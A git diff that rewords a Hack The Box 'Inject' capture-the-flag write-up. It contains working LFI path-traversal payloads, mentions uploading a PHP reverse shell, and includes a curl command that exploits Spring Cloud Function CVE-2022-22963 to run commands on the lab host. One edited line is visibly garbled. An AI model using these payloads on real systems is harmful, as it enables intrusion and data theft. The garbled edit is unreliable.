@@ -3,7 +3,7 @@ https://app.hackthebox.com/machines/533
 
 ## Enumeration :
 
-Started with quick rustscan & found 2 open ports: 22 & 8080
+I started with a quick rustscan and found two open ports: 22 and 8080.
 
 ```
 sudo rustscan -a 10.10.11.204 -- -sC -sV -T4 -vv -oN inject_nmap
@@ -28,74 +28,75 @@ PORT     STATE SERVICE     REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-When checked the website running on port 8080 found it's providing the cloud & file share services :
+Upon checking the website running on port 8080, I discovered that it provides cloud and file-sharing services:
 
 ![image](https://user-images.githubusercontent.com/87700008/224534505-28220236-e135-4893-9981-26d5478f513e.png)
 
-By going onto the '/blogs' section I found 3 blogs written by 2 users : "admin" & " Brandon Auger"
+By going to the '/blogs' section, I found three blogs written by two users: "admin" and "Brandon Auger":
 
 ![image](https://user-images.githubusercontent.com/87700008/224534657-01d2e78c-10d3-4e3c-987b-888afa023021.png)
 
-Moving further when I checked the HTML source code of the page I didn't found anything special. So, I moved onto the directory list & subdomain enumeration.
+Moving further, I checked the HTML source code of the page, but I didn't find anything special. So, I moved on to directory listing and subdomain enumeration.
 
-In subdomain or VHOST enumeration & I didn't found anything :
+During subdomain or VHOST enumeration, I didn't find anything:
 
 ![image](https://user-images.githubusercontent.com/87700008/224540315-9024f38b-f8a5-4641-8cad-c6d61dccf4da.png)
 
-In directory list I found some directories :
+However, in the directory list, I found some directories :
 
 ![image](https://user-images.githubusercontent.com/87700008/224540364-b533d963-7d2f-4667-a516-20b71d806188.png)
 
-I started checking with 'release_notes' but on this page there are only release notifications :
+I checked 'release_notes,' but on this page, there were only release notifications :
 
 ![image](https://user-images.githubusercontent.com/87700008/224542030-b05e0ee7-d985-42e5-aad6-c3ae5723ffb2.png)
 
-Then I tried to register on the page but the page is under the construction :
+I attempted to register on the page, but it was under construction :
 
 ![image](https://user-images.githubusercontent.com/87700008/224542194-41843693-c291-404f-8c54-4603d81f1417.png)
 
-Then I moved onto the '/uploads' section & after uploading the php reverse shell I observed that I can only upload image files. So, I uploaded on the file with '.jpg' extension & found that it's leading me to another page where I can see my uploaded image.
+Next, I went to the '/uploads' section, and after uploading the PHP reverse shell, I observed that I could only upload image files. So, I uploaded a file with a '.jpg' extension and found that it led me to another page where I could see my uploaded image.
 
       /show_image?img=php-reverse-shell.php.jpg
       
  ![image](https://user-images.githubusercontent.com/87700008/224542405-281c94f6-e0d0-4a33-91df-510489a706b9.png)
 
-I tried the '/show_image?img=' path with some LFI payloads & started checking with '/etc/passwd'. After performing multiple payloads I entered the below payload & observed 200 response.
+I tested the '/show_image?img=' path with some LFI payloads and started checking with '/etc/passwd.' After trying multiple payloads, I entered the below payload and observed a 200 response.
 
     &.//&.//&.//&.//&.//etc/group
     
 ![image](https://user-images.githubusercontent.com/87700008/224542604-ab7a9e08-3a79-4bba-82f9-3e363a24ec51.png)
 
-I am confirmed here that this path is vulnerable to LFI but I still not able to read the /etc/passwd content, so again I tried some LFI payloads & after some times I got success with this payload :
+I confirmed here that this path is vulnerable to LFI, but I still couldn't read the /etc/passwd content, so I tried some more LFI payloads. 
+After some time, I had success with this payload :
 
     ../../../../../../../../../../../../../../../../etc/passwd
     
 ![image](https://user-images.githubusercontent.com/87700008/224542688-f6d088b2-33e1-49dd-b149-684d6b969433.png)
 
-I found 2 users in the above list 'frank' & 'phil'
+I found two users in the above list": "I found two users in the above list, 'frank' and 'phil'.
 
 With further enumeration I found below results :
 
 ![image](https://user-images.githubusercontent.com/87700008/224726062-e0834f2c-79ee-421c-92f6-1aa985611374.png)
 
-Enumerating further into below mentioned directory I found an xml config file :
+Going further into the below-mentioned directory, I found an XML config file :
 
     ../../../../../../../../../../../../../../../../var/www/WebApp/pom.xml
     
-In this config file I found a framework running with "Spring cloud function". Which is vulnerable to RCE found in this [blog](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645) by Snyk
+In this config file, I found a framework running with 'Spring cloud function,' which is vulnerable to RCE, as found in this [blog](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645) by Snyk
     
 ![image](https://user-images.githubusercontent.com/87700008/224727399-f526600f-191f-4142-82ef-acba6a648a56.png)
 
 
-I found this [exploit](https://github.com/darryk10/CVE-2022-22963) on GitHub for the spring framework module.
+I discovered a vulnerability in the spring framework module, and found an [exploit](https://github.com/darryk10/CVE-2022-22963) on GitHub for the spring framework module.
 
-Following the exploit I executed the below curl command to check wether I am able to create any file in the 'tmp' directory or not.
+To test whether I could create a file in the 'tmp' directory, I executed the following curl command:
 
     curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/expl0it")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
 
 ![image](https://user-images.githubusercontent.com/87700008/224731422-f9dbf038-60a4-476b-b74c-3830b819a528.png)
 
-I observed that my 'expl0it' folder got created in the temp directory, now It's time for the shell.
+After running the command, I checked the 'tmp' directory and found that the 'expl0it' folder had been successfully created. With the directory in place, I was able to proceed to the next step of the attack.
 
 ### Initial access:
 
